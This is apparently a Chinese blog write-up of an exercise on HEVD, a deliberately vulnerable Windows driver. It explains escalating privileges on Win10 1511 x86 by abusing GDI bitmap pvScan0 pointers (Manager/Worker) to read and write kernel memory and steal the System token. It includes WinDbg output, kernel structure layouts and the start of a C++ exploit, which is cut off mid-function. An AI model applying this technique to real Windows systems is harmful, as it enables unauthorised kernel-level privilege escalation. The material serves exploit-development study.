<!doctype html><html lang="zh"><head><meta charset="utf-8"><meta name="generator" content="Hexo 4.2.0"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta><title>HEVD ArbitraryOverwrite BitMap [win10v1511x86] - 食兔人的博客</title><meta description="前面，我们通过复写内核中的HalDispatchTable实现了提权，但是在Win10以后，想在内核中执行shellcode需要绕过很多保护措施的，因此这里我们引入一种新的方法实现对内核的利用"><meta property="og:type" content="blog"><meta property="og:title" content="食兔人的博客"><meta property="og:url" content="https://blog.ycdxsb.cn/ec47a9ad.html"><meta property="og:site_name" content="食兔人的博客"><meta property="og:description" content="前面，我们通过复写内核中的HalDispatchTable实现了提权，但是在Win10以后，想在内核中执行shellcode需要绕过很多保护措施的，因此这里我们引入一种新的方法实现对内核的利用"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-31-03-upload_6c619c03efe57acbb12f556c46175be9.png"><meta property="og:image" content="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-31-03-upload_c57402a45a6b759e664eb6ee99ee3c1d.png"><meta property="article:published_time" content="2021-03-31T14:14:00.000Z"><meta property="article:modified_time" content="2021-04-01T01:46:25.144Z"><meta property="article:author" content="ycdxsb"><meta property="article:tag" content="research"><meta property="article:tag" content="HEVD"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-31-03-upload_6c619c03efe57acbb12f556c46175be9.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.ycdxsb.cn/ec47a9ad.html"},"headline":"食兔人的博客","image":["https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-31-03-upload_6c619c03efe57acbb12f556c46175be9.png","https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-31-03-upload_c57402a45a6b759e664eb6ee99ee3c1d.png"],"datePublished":"2021-03-31T14:14:00.000Z","dateModified":"2021-04-01T01:46:25.144Z","author":{"@type":"Person","name":"ycdxsb"},"description":"前面，我们通过复写内核中的HalDispatchTable实现了提权，但是在Win10以后，想在内核中执行shellcode需要绕过很多保护措施的，因此这里我们引入一种新的方法实现对内核的利用"}</script><link rel="canonical" href="https://blog.ycdxsb.cn/ec47a9ad.html"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><link rel="alternate" href="/atom.xml" title="食兔人的博客" type="application/atom+xml">
<link rel="alternate" href="/rss2.xml" title="食兔人的博客" type="application/rss+xml">
</head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">食兔人的博客</a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-6-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><time class="level-item" datetime="2021-03-31T14:14:00.000Z" title="2021-03-31T14:14:00.000Z">2021-03-31</time><span class="level-item"> ycdxsb </span><span class="level-item"><a class="link-muted" href="/categories/research/">research</a><span> / </span><a class="link-muted" href="/categories/research/HEVD/">HEVD</a></span><span class="level-item">14 分钟 读完 (大约 2125 个字)</span><span class="level-item" id="busuanzi_container_page_pv"><i class="far fa-eye"></i>&nbsp;&nbsp;<span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">HEVD ArbitraryOverwrite BitMap [win10v1511x86]</h1><div class="content"><blockquote><p>前面，我们通过复写内核中的HalDispatchTable实现了提权，但是在Win10以后，想在内核中执行shellcode需要绕过很多保护措施的，因此这里我们引入一种新的方法实现对内核的利用</p></blockquote><a id="more"></a><h2><span id="pli-yong-fen-xi">利用分析</span><a href="#pli-yong-fen-xi" class="header-anchor">#</a></h2><p>我们本质上还是要实现将exp进程的token替换为System的token，where是exp进程token地址，what是System进程token</p><h3><span id="pzhao-system-jin-cheng-token">找System进程token</span><a href="#pzhao-system-jin-cheng-token" class="header-anchor">#</a></h3><p>原理：windows kernel中存在一个PsInitialSystemProcess的指针，指向System进程的EPROCESS</p><blockquote><p>windows kernel在不同环境下有不同名称：</p><ul><li>ntoskrnl 单处理器，不支持PAE</li><li>ntkrnlpa 单处理器，支持PAE</li><li>ntkrnlmp 多处理器，不支持PAE</li><li>ntkrpamp 多处理器，支持PAE</li></ul></blockquote><p>我们调试看看</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dd nt!PsInitialSystemProcess</span><br><span class="line"><span class="number">83f</span>a703c  <span class="number">855f</span>89e8 <span class="number">83f</span>72640 <span class="number">8</span>ec414b0 <span class="number">00010000</span></span><br><span class="line"><span class="number">83f</span>a704c  <span class="number">00000</span>cd8 <span class="number">00000258</span> <span class="number">00000000</span> <span class="number">00000001</span></span><br><span class="line"><span class="number">83f</span>a705c  <span class="number">00000000</span> <span class="number">0000004b</span> <span class="number">00000001</span> <span class="number">00989680</span></span><br><span class="line"><span class="number">83f</span>a706c  <span class="number">00000000</span> <span class="number">00000029</span> <span class="number">00000002</span> c0ffffff</span><br><span class="line"><span class="number">83f</span>a707c  c0607ff8 <span class="number">00000000</span> <span class="number">00000000</span> c0403080</span><br><span class="line"><span class="number">83f</span>a708c  <span class="number">00000000</span> <span class="number">00000100</span> <span class="number">00000500</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">83f</span>a709c  <span class="number">00000001</span> <span class="number">00000000</span> <span class="number">00000003</span> <span class="number">00040107</span></span><br><span class="line"><span class="number">83f</span>a70ac  <span class="number">00000000</span> <span class="number">83f</span>a70b0 <span class="number">83f</span>a70b0 <span class="number">00000000</span></span><br><span class="line">kd&gt; !<span class="built_in">process</span> <span class="number">4</span> <span class="number">0</span> </span><br><span class="line">Searching <span class="keyword">for</span> <span class="built_in">Process</span> with Cid == <span class="number">4</span></span><br><span class="line">PROCESS <span class="number">855f</span>89e8  SessionId: none  Cid: <span class="number">0004</span>    Peb: <span class="number">00000000</span>  ParentCid: <span class="number">0000</span></span><br><span class="line">    DirBase: <span class="number">00185000</span>  ObjectTable: <span class="number">89201b</span>60  HandleCount: <span class="number">552.</span></span><br><span class="line">    Image: System</span><br></pre></td></tr></table></figure><p>PsInitialSystemProcess的值我们可以在用户态使用API获取到，但是即使我们知道了，EPROCESS的地址，我们也没有足够的权限去读写它，这个时候就需要用到BitMap这个东西了</p><h3><span id="pbitmap-jie-gou">BitMap结构</span><a href="#pbitmap-jie-gou" class="header-anchor">#</a></h3><p>BitMap是Windows GDI的一个对象，存在于内核中，可以帮助我们实现任意地址读写。</p><p><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-31-03-upload_6c619c03efe57acbb12f556c46175be9.png" alt="img"><br>当新建一个BitMap对象时，会在内核中分配三个结构，分别是BaseObject,SURFObj和Pixel Data，其中SURFOBJ中的pvScan0指向Pixel Data</p><p><strong>BASEOBJECT</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">BASEOBJECT32</span> // 5 <span class="title">elements</span>, 0<span class="title">x10</span> <span class="title">bytes</span> (<span class="title">sizeof</span>)</span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">	ULONG32 hHmgr;</span><br><span class="line">	ULONG32 ulShareCount;</span><br><span class="line">	WORD cExclusiveLock;</span><br><span class="line">	WORD BaseFlags;</span><br><span class="line">	ULONG32 Tid;</span><br><span class="line"> &#125;BASEOBJECT32, *PBASEOBJECT32; </span><br><span class="line"> </span><br><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">BASEOBJECT64</span> // 0<span class="title">x18</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">	ULONG64 hHmgr;</span><br><span class="line">	ULONG32 ulShareCount;</span><br><span class="line">	WORD cExclusiveLock;</span><br><span class="line">	WORD BaseFlags;</span><br><span class="line">	ULONG64 Tid;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> <span class="keyword">operator</span>=(<span class="keyword">const</span> BASEOBJECT32 &amp;base )</span><br><span class="line">	&#123;</span><br><span class="line">		hHmgr = base.hHmgr;</span><br><span class="line">		ulShareCount = base.ulShareCount;</span><br><span class="line">		cExclusiveLock = base.cExclusiveLock;</span><br><span class="line">		BaseFlags = base.cExclusiveLock;</span><br><span class="line">		Tid = base.Tid;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">bool</span> <span class="keyword">operator</span>==(<span class="keyword">const</span> _BASEOBJECT64 &amp;base )</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> ((hHmgr == base.hHmgr) &amp;&amp; (Tid == base.Tid));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">dump</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		dprint(<span class="string">"BASEOBJECT:\n"</span>);</span><br><span class="line">		dprint(<span class="string">"\thHmgr: %08lx\n"</span>, hHmgr);</span><br><span class="line">		dprint(<span class="string">"\tulShareCount: %08lx\n"</span>, ulShareCount);</span><br><span class="line">		dprint(<span class="string">"\tcExclusiveLock: %04lx\n"</span>, cExclusiveLock);</span><br><span class="line">		dprint(<span class="string">"\tBaseFlags: %04lx\n"</span>, BaseFlags);</span><br><span class="line">		dprint(<span class="string">"\tTid: %016I64x\n\n"</span>, Tid);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"> &#125;BASEOBJECT64, *PBASEOBJECT64;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://github.com/panoramixor/GDIObjDump/blob/master/src/GDIObjDump/common.h">https://github.com/panoramixor/GDIObjDump/blob/master/src/GDIObjDump/common.h</a></p><p>再看<strong>SURFOBJ</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SURFOBJ32</span> &#123;</span> pvScan0偏移<span class="number">0x20</span></span><br><span class="line">	ULONG32 dhsurf;  <span class="comment">// +4</span></span><br><span class="line">	ULONG32  hsurf;  <span class="comment">// +4</span></span><br><span class="line">	ULONG32 dhpdev;  <span class="comment">// +4</span></span><br><span class="line">	ULONG32   hdev;  <span class="comment">// +4</span></span><br><span class="line">	SIZEL  sizlBitmap; <span class="comment">// +8</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        typedef struct tagSIZE</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            LONG        cx;</span></span><br><span class="line"><span class="comment">            LONG        cy;</span></span><br><span class="line"><span class="comment">        &#125; SIZE, *PSIZE, *LPSIZE;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        typedef SIZE               SIZEL;</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">	ULONG  cjBits;   <span class="comment">// +4</span></span><br><span class="line">	ULONG32  pvBits; <span class="comment">// +4</span></span><br><span class="line">	ULONG32  pvScan0; </span><br><span class="line">	LONG   lDelta;</span><br><span class="line">	ULONG  iUniq;</span><br><span class="line">	ULONG  iBitmapFormat;</span><br><span class="line">	USHORT iType;</span><br><span class="line">	USHORT fjBitmap;</span><br><span class="line">&#125; SURFOBJ32 ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SURFOBJ64</span> &#123;</span> pvScan0偏移<span class="number">0x38</span></span><br><span class="line">	ULONG64  dhsurf; <span class="comment">// +8</span></span><br><span class="line">	ULONG64  hsurf;  <span class="comment">// +8</span></span><br><span class="line">	ULONG64  dhpdev; <span class="comment">// +8</span></span><br><span class="line">	ULONG64  hdev;   <span class="comment">// +8</span></span><br><span class="line">	SIZEL  sizlBitmap; <span class="comment">// +8</span></span><br><span class="line">	ULONG64  cjBits; <span class="comment">// +8</span></span><br><span class="line">	ULONG64  pvBits; <span class="comment">// +8</span></span><br><span class="line">	ULONG64  pvScan0;</span><br><span class="line">	LONG32  lDelta;</span><br><span class="line">	ULONG32  iUniq;</span><br><span class="line">	ULONG32  iBitmapFormat;</span><br><span class="line">	USHORT  iType;</span><br><span class="line">	USHORT  fjBitmap;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">void</span> <span class="keyword">operator</span>=(<span class="keyword">const</span> SURFOBJ32 &amp;surf )</span><br><span class="line">	&#123;</span><br><span class="line">		dhsurf = surf.dhsurf;</span><br><span class="line">		hsurf = surf.hsurf;</span><br><span class="line">		dhpdev = surf.dhpdev;</span><br><span class="line">		hdev = surf.hdev;</span><br><span class="line">		sizlBitmap = surf.sizlBitmap;</span><br><span class="line">		cjBits = surf.cjBits;</span><br><span class="line">		pvBits = surf.pvBits;</span><br><span class="line">		pvScan0 = surf.pvScan0;</span><br><span class="line">		lDelta = surf.lDelta;</span><br><span class="line">		iUniq = surf.iUniq;</span><br><span class="line">		iBitmapFormat = surf.iBitmapFormat;</span><br><span class="line">		iType = surf.iType;</span><br><span class="line">		fjBitmap = surf.fjBitmap;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125; SURFOBJ64;</span><br></pre></td></tr></table></figure><p>重点关注其中的pvScan0变量，我们通过<a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-getbitmapbits">GetBitmapBits</a>和<a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-setbitmapbits">SetBitmapBits</a>来读写pvScan0指向的PixelData数据区</p><h3><span id="pguan-jian-dian-pvscan0">关键点pvScan0</span><a href="#pguan-jian-dian-pvscan0" class="header-anchor">#</a></h3><p>pvScan0指向的PixelData位于内核之中，因此如果可以控制pvScan0的值，我们就可以通过API去读写任意地址了。<br>我们再看一下CreateBitMap函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HBITMAP <span class="title">CreateBitmap</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span>        nWidth,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span>        nHeight,</span></span></span><br><span class="line"><span class="function"><span class="params">  UINT       nPlanes,</span></span></span><br><span class="line"><span class="function"><span class="params">  UINT       nBitCount,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">const</span> VOID *lpBits</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-createbitmap">https://docs.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-createbitmap</a><br>其中的lpBits描述如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lpBits</span><br><span class="line"></span><br><span class="line">A pointer to an array of color data used to set the colors in a rectangle of pixels. Each scan line in the rectangle must be word aligned (scan lines that are not word aligned must be padded with zeros). If this parameter is NULL, the contents of the new bitmap is undefined.</span><br></pre></td></tr></table></figure><p>而对应的pvScan0描述如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pvScan0</span><br><span class="line"></span><br><span class="line">Pointer to the first scan line of the bitmap. If iBitmapFormat is BMF_JPEG or BMF_PNG, this member is NULL.</span><br></pre></td></tr></table></figure><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winddi/ns-winddi-surfobj">https://docs.microsoft.com/en-us/windows/win32/api/winddi/ns-winddi-surfobj</a></p><p>CreateBitmap 创建 Bitmap 对象后，会返回对应的资源句柄，该句柄的低16位是数组的访问下标</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UINT index &#x3D; hBitmap &amp; 0xFFFF;</span><br></pre></td></tr></table></figure><p>通过该下标可以找到对应的GDI对象描述</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">GDI_CELL</span> <span class="title">GdiSharedHandleTable</span>[0<span class="title">x8fff</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">GDI_CELL</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    IntPtr pKernelAddress;</span><br><span class="line">    UInt16 wProcessId;</span><br><span class="line">    UInt16 wCount;</span><br><span class="line">    UInt16 wUpper;</span><br><span class="line">    UInt16 wType;</span><br><span class="line">    IntPtr pUserAddress;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里GdiSharedHandleTable可以通过TEB-&gt;PEB-&gt;GdiSharedHandleTable的路径获取到。<br>GDI_CELL结构在32位下大小为0x10，64位下为0x18。它的第一个指针 pKernelAddress 指向了 BASEOBJECT 的第一个字节，也就是说</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pvScan0 &#x3D; *(PDWORD32)pKernelAddress + (x86:0x10,x64:0x18) + (x86:0x20,x64:0x38)</span><br></pre></td></tr></table></figure><p>正是 pvScan0 的地址,具体偏移计算在前面结构处可以看到。至此，由于Windows实现问题，我们已经可以在用户态找到内核中的pvScan0地址了</p><h3><span id="pbitmap-li-yong">BITMAP利用</span><a href="#pbitmap-li-yong" class="header-anchor">#</a></h3><p>总的来说，当我们有了一个任意地址写任意值的能力时，我们可以通过以下流程使用BITMAP进行利用</p><ol><li>新建BITMAP结构</li><li>用户态获取位于内核中的pvScan0地址</li><li>任意地址写漏洞改写 pvScan0 的值为我们想要读写的地址</li><li>使用GetBitMapBits和SetBitMapBits读写任意值</li></ol><p>但是上面的流程好像只比原来的漏洞多了一个读的能力，当漏洞只能触发一次时，一次读写根本不能满足我们想要达到的目的，那怎么实现多次任意读写实现对内核的完全控制呢？这里就要通过两个BitMap结构实现了。</p><p>Manager + Worker实现读写内核完全控制<br><img src="https://ycdxsb-1257345996.cos.ap-beijing.myqcloud.com/blog/2021-31-03-upload_c57402a45a6b759e664eb6ee99ee3c1d.png" alt="img"></p><p>具体流程如下：</p><ol><li>用户态新建Manager和Worker两个BitMap</li><li>使用任意地址写覆盖Manager的pvScan0为Worker的pvScan0地址</li><li>在用户态，操作Manager，可以替换Worker的pvScan0地址，再通过Worker来读写任意内存</li><li>通过任意地址读获取System进程的token</li><li>通过任意地址写替换当前进程token</li></ol><h2><span id="pc-exp-vs2017">C++ exp(VS2017)</span><a href="#pc-exp-vs2017" class="header-anchor">#</a></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">WRITE_WHAT_WHERE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	PULONG_PTR What;</span><br><span class="line">	PULONG_PTR Where;</span><br><span class="line">&#125; WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;</span><br><span class="line"><span class="keyword">char</span> driverName[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">readOOB</span><span class="params">(HBITMAP hManager, HBITMAP hWorker, DWORD32 whereWrite, LPVOID whatWrite, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SetBitmapBits(hManager, len, &amp;whereWrite); <span class="comment">// set 写的是 hWorker 的 pvScan0 的值 , 通过控制 hWorker 的 pvScan0 的值来决定对哪块地址进行读写</span></span><br><span class="line">	GetBitmapBits(hWorker, len, whatWrite);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">writeOOB</span><span class="params">(HBITMAP hManager, HBITMAP hWorker, DWORD32 whereWrite, LPVOID whatWrite, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SetBitmapBits(hManager, len, &amp;whereWrite);</span><br><span class="line">	SetBitmapBits(hWorker, len, &amp;whatWrite);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD32 <span class="title">getKernelBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	LPVOID lpImageBase[<span class="number">1024</span>];</span><br><span class="line">	DWORD lpcbNeeded;</span><br><span class="line">	<span class="comment">//Retrieves the load address for each device driver in the system</span></span><br><span class="line">	EnumDeviceDrivers(lpImageBase, <span class="keyword">sizeof</span>(lpImageBase), 